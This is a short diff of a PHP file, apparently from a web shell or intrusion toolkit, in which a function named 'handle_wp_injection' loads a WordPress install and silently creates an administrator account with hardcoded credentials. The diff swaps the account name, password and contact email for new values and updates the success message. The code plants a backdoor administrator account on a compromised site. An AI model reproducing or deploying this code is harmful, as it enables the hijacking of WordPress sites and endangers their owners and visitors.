@@ -146,15 +146,15 @@ function handle_wp_injection($path) {
 
     require_once("$wp/wp-load.php");
 
-    $user = 'savvy';
-    $pass = 'SavvyMrx#';
-    $mail = 'savvy@domain.com';
+    $user = 'sadmin';
+    $pass = '!m4l1k4$@$T0L###';
+    $mail = 'rizkaameliaa022@gmail.com';
 
     if (!username_exists($user) && !email_exists($mail)) {
         $uid = wp_create_user($user, $pass, $mail);
         $wp_user = new WP_User($uid);
         $wp_user->set_role('administrator');
-        echo "<p style='color:#0f0;'>✅ WP Admin user 'savvy' created.</p>";
+        echo "<p style='color:#0f0;'>✅ WP Admin user 'sadmin' created.</p>";
     } else {
         echo "<p style='color:#ff0;'>⚠️ User/email already exists.</p>";
     }
